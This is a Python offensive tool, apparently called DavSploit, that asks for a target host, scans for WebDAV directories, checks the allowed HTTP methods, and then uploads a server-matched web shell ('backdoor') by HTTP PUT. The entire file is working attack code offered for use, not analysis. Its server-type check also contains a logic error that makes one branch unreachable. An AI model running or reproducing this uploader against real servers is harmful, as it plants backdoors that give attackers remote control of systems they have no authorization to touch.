
import requests
from colorama import Fore
import sys

print(Fore.MAGENTA + """

╔╦╗╔═╗╦  ╦╔═╗┌─┐┬  ┌─┐┬┌┬┐
 ║║╠═╣╚╗╔╝╚═╗├─┘│  │ ││ │ 
═╩╝╩ ╩ ╚╝ ╚═╝┴  ┴─┘└─┘┴ ┴ """ + Fore.CYAN + """ Version 1.1 
        
""" + Fore.RESET)

target = input("[" + Fore.YELLOW + "Target" + Fore.RESET + "] Enter IP or Domain name to Attack? ")

methods = ["PUT","MOVE","COPY","DELETE","PATCH","CONNECT","TRACE"]
dirs = ["/","/dav","/webdav","/WebDav"]
url = target

try:
    r = requests.get("http://" + url + "/",timeout=5)
    headers = r.headers
except:
    print("[" + Fore.YELLOW + "Warning" + Fore.RESET + "] HTTP Server Unreachable")
    sys.exit()
    
print("[" + Fore.YELLOW + "Webserver" + Fore.RESET + "] " + r.headers["Server"])
print("[" + Fore.YELLOW + "Testing" + Fore.RESET + "] URL: http://" + url)

print("[" + Fore.YELLOW + "Testing" + Fore.RESET + "] for webdav Directories" + Fore.RESET + "")    
for directory in dirs:
    check_dav = requests.get("http://" + url + directory)
    check_dav_options = requests.options("http://" + url + directory)
    if '200' in str(check_dav.status_code):
        print("[" + Fore.GREEN + "Found" + Fore.RESET + "] " + directory + " Directory Found")
        
        if 'PUT' in str(check_dav_options.headers):
            print("[" + Fore.RED + "DANGEROUS" + Fore.RESET + "] Server Allows PUT Method")
        else:
            print("[" + Fore.YELLOW + "Failed" + Fore.RESET + "] PUT Method not Accepted")
        if 'MOVE' in str(check_dav_options.headers):
            print("[" + Fore.RED + "DANGEROUS" + Fore.RESET + "] Server Allows MOVE Method")
        else:
            print("[" + Fore.YELLOW + "Failed" + Fore.RESET + "] MOVE Method not Accepted")
        if 'COPY' in str(check_dav_options.headers):
            print("[" + Fore.RED + "DANGEROUS" + Fore.RESET + "] Server Allows COPY Method")
        else:
            print("[" + Fore.YELLOW + "Failed" + Fore.RESET + "] COPY Method not Accepted")
        if 'DELETE' in str(check_dav_options.headers):
            print("[" + Fore.RED + "DANGEROUS" + Fore.RESET + "] Server Allows DELETE Method")
        else:
            print("[" + Fore.YELLOW + "Failed" + Fore.RESET + "] DELETE Method not Accepted")
            
        if 'PATCH' in str(check_dav_options.headers):
            print("[" + Fore.RED + "DANGEROUS" + Fore.RESET + "] Server Allows PATCH Method")
        else:
            print("[" + Fore.YELLOW + "Failed" + Fore.RESET + "] PATCH Method not Accepted")
        if 'CONNECT' in str(check_dav_options.headers):
            print("[" + Fore.RED + "DANGEROUS" + Fore.RESET + "] Server Allows CONNECT Method")
        else:
            print("[" + Fore.YELLOW + "Failed" + Fore.RESET + "] CONNECT Method not Accepted")
        if 'TRACE' in str(check_dav_options.headers):
            print("[" + Fore.RED + "DANGEROUS" + Fore.RESET + "] Server Allows TRACE Method")
        else:
            print("[" + Fore.YELLOW + "Failed" + Fore.RESET + "] TRACE Method not Accepted")

        #Exploit
        if 'Coyote' in headers['Server']:
            backdoor = open("shell.jsp","rb")
            file_name = 'shell.jsp'
            
        elif 'Apache' or 'Nginx' in headers['Server']:
            backdoor = open("shell.php","rb")
            file_name = 'shell.php'
   
        elif 'Windows' in headers['Server']:
            backdoor = open("shell.aspx","rb")
            file_name = 'shell.aspx'
            
        elif len(headers['Server']) < 2:
             backdoor = open("index.html","rb")
             file_name = 'index.html'
             
        exploit = requests.put("http://" + url + directory + "/" + '' + file_name,headers={'Content-type': 'text/plain'},data=backdoor)
        if file_name + ' has been created' in str(exploit.text):
            print("[" + Fore.RED + "Exploit Successful" + Fore.RESET + "] " + file_name +  " File Uploaded")
        else:
            print("[" + Fore.YELLOW + "Exploit Failed" + Fore.RESET + "]" + " PUT Method not Allowed")   
